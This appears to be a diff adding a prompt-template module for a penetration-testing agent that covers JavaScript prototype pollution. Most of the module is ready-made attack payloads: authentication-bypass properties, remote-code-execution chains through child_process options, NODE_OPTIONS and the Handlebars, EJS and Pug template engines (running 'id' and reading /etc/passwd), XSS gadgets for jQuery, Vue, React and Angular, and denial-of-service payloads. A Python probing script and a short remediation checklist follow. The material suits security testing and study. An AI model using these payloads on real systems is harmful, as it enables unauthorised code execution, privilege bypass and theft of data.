@@ -1,0 +1,292 @@
+{# Prototype Pollution Module #}
+{# JavaScript prototype pollution attacks #}
+
+<prototype_pollution_module>
+
+## PROTOTYPE POLLUTION GUIDE
+
+### UNDERSTANDING PROTOTYPE POLLUTION
+
+**What is it?**
+Prototype pollution is a JavaScript vulnerability where an attacker can modify `Object.prototype`, affecting all objects in the application and potentially leading to RCE, XSS, or DoS.
+
+**Vulnerable Patterns:**
+```javascript
+// Most common vulnerable patterns
+obj[a][b] = value;
+_.merge(obj, userInput);
+$.extend(true, obj, userInput);
+Object.assign(obj, userInput);
+JSON.parse(untrustedData);
+```
+
+### DETECTION PAYLOADS
+
+**Basic Detection:**
+```json
+{"__proto__": {"polluted": "yes"}}
+{"constructor": {"prototype": {"polluted": "yes"}}}
+{"__proto__.polluted": "yes"}
+```
+
+**Query Parameter Pollution:**
+```
+?__proto__[polluted]=yes
+?__proto__.polluted=yes
+?constructor[prototype][polluted]=yes
+?constructor.prototype.polluted=yes
+```
+
+**Nested Object Pollution:**
+```json
+{
+  "a": {
+    "__proto__": {
+      "polluted": "yes"
+    }
+  }
+}
+```
+
+### EXPLOITATION TECHNIQUES
+
+**1. Property Injection:**
+```json
+// Set admin property on all objects
+{"__proto__": {"admin": true}}
+
+// Bypass authentication checks
+if (user.admin) {
+  // If Object.prototype.admin = true, this passes!
+}
+```
+
+**2. RCE via child_process:**
+```json
+// When child_process.spawn is called without shell=false
+{"__proto__": {"shell": true}}
+{"__proto__": {"shell": "/proc/self/exe"}}
+{"__proto__": {"env": {"EVIL": "payload"}}}
+
+// Exploiting NODE_OPTIONS
+{"__proto__": {"NODE_OPTIONS": "--require /tmp/evil.js"}}
+```
+
+**3. RCE via Template Engines:**
+```json
+// Handlebars RCE
+{
+  "__proto__": {
+    "type": "Program",
+    "body": [{
+      "type": "MustacheStatement",
+      "path": 0,
+      "params": [{
+        "type": "NumberLiteral",
+        "value": "process.mainModule.require('child_process').execSync('id')"
+      }]
+    }]
+  }
+}
+
+// EJS RCE
+{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}}
+
+// Pug RCE
+{"__proto__": {"block": {"type": "Text", "val": "x]});process.mainModule.require('child_process').execSync('id');//"}}}
+```
+
+**4. Client-Side XSS:**
+```json
+// jQuery $.extend pollution
+{"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}
+
+// DOM clobbering via pollution
+{"__proto__": {"src": "javascript:alert(1)"}}
+{"__proto__": {"href": "javascript:alert(1)"}}
+
+// Script gadgets
+{"__proto__": {"data-trigger": "click", "onclick": "alert(1)"}}
+```
+
+**5. Denial of Service:**
+```json
+// Length pollution
+{"__proto__": {"length": 1000000000}}
+
+// toString pollution
+{"__proto__": {"toString": null}}
+
+// Constructor pollution
+{"__proto__": {"constructor": null}}
+```
+
+### FRAMEWORK-SPECIFIC EXPLOITS
+
+**Express.js:**
+```json
+// EJS template engine RCE
+{
+  "__proto__": {
+    "outputFunctionName": "_tmp = global.process.mainModule.require('child_process').execSync('cat /etc/passwd'); __tmp"
+  }
+}
+
+// Pug/Jade RCE
+{
+  "__proto__": {
+    "block": {
+      "type": "Text",
+      "val": "x]});return global.process.mainModule.require('child_process').execSync('id');//"
+    }
+  }
+}
+```
+
+**Lodash Merge:**
+```javascript
+// Vulnerable pattern
+_.merge({}, JSON.parse(userInput));
+
+// Exploit
+{"__proto__": {"polluted": true}}
+```
+
+**jQuery Extend:**
+```javascript
+// Vulnerable
+$.extend(true, {}, userInput);
+
+// Exploit
+{"__proto__": {"isAdmin": true}}
+```
+
+### SERVER-SIDE RCE CHAINS
+
+**Node.js child_process:**
+```json
+// Pollute spawn options
+{
+  "__proto__": {
+    "shell": true,
+    "env": {
+      "NODE_DEBUG": "child_process",
+      "NODE_OPTIONS": "--require /tmp/evil.js"
+    }
+  }
+}
+```
+
+**Require Hijacking:**
+```json
+// Pollute module paths
+{
+  "__proto__": {
+    "exports": {
+      ".": "./malicious.js"
+    }
+  }
+}
+```
+
+### CLIENT-SIDE GADGETS
+
+**HTML5 Gadgets:**
+```json
+// srcdoc pollution
+{"__proto__": {"srcdoc": "<script>alert(1)</script>"}}
+
+// data-* attributes
+{"__proto__": {"data-value": "<img src=x onerror=alert(1)>"}}
+
+// defaultValue
+{"__proto__": {"defaultValue": "<script>alert(1)</script>"}}
+```
+
+**Framework Gadgets:**
+```json
+// Vue.js
+{"__proto__": {"template": "<img src=x onerror=alert(1)>"}}
+
+// React dangerouslySetInnerHTML
+{"__proto__": {"__html": "<script>alert(1)</script>"}}
+
+// Angular (older versions)
+{"__proto__": {"ng-init": "constructor.constructor('alert(1)')()"}}
+```
+
+### DETECTION SCRIPT
+
+```python
+#!/usr/bin/env python3
+"""
+Prototype Pollution Detection Script
+"""
+
+import requests
+import json
+
+PAYLOADS = [
+    {"__proto__": {"polluted": "yes"}},
+    {"constructor": {"prototype": {"polluted": "yes"}}},
+]
+
+def test_json_endpoint(url, method="POST"):
+    """Test JSON endpoint for prototype pollution."""
+    headers = {"Content-Type": "application/json"}
+    
+    for payload in PAYLOADS:
+        r = requests.request(method, url, json=payload, headers=headers)
+        
+        # Check if pollution persists
+        check = requests.get(url)
+        if "polluted" in check.text:
+            print(f"[+] VULNERABLE: {json.dumps(payload)}")
+            return True
+    
+    return False
+
+def test_query_params(url):
+    """Test query parameters for pollution."""
+    payloads = [
+        "?__proto__[polluted]=yes",
+        "?__proto__.polluted=yes",
+        "?constructor[prototype][polluted]=yes",
+    ]
+    
+    for payload in payloads:
+        r = requests.get(url + payload)
+        if "polluted" in r.text:
+            print(f"[+] VULNERABLE: {payload}")
+            return True
+    
+    return False
+
+if __name__ == "__main__":
+    import sys
+    url = sys.argv[1]
+    test_json_endpoint(url)
+    test_query_params(url)
+```
+
+### AUTOMATED TESTING
+
+```bash
+# Using pp-finder
+npx pp-finder https://target.com
+
+# Manual browser testing
+console.log({}.polluted);  // Check if prototype is polluted
+```
+
+### REMEDIATION
+
+- [ ] Use `Object.create(null)` for dictionaries
+- [ ] Freeze prototypes: `Object.freeze(Object.prototype)`
+- [ ] Validate JSON keys (reject `__proto__`, `constructor`)
+- [ ] Use Map instead of plain objects
+- [ ] Update vulnerable libraries (lodash, jQuery)
+- [ ] Use schema validation (ajv, joi)
+- [ ] Use `--frozen-intrinsics` flag (Node.js)
+
+</prototype_pollution_module>
